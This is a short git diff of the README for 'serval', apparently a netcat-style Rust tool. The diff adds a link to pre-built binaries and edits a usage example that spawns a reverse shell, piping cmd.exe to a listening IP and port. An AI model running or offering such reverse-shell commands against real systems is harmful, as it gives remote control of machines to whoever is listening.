@@ -22,7 +22,7 @@ You can build for other platforms using
 > cargo build --release --target \<target-triple>
 
 #### Other
-Pre-built binaries coming soon! Check back in a few days! 
+If you're a particulary trusting individual you can download the pre-built binaries [here](https://github.com/tgadola/serval/releases).
 
 ### Usage
 
@@ -33,7 +33,7 @@ Serval listens on all interfaces
 > serval -l 4400
 
 #### Spawn a reverse shell 
-> serval \<listening ip> \<listening port> -q -e cmd.exe
+> serval.exe \<listening ip> \<listening port> -q -e cmd.exe
 
 #### ????
 
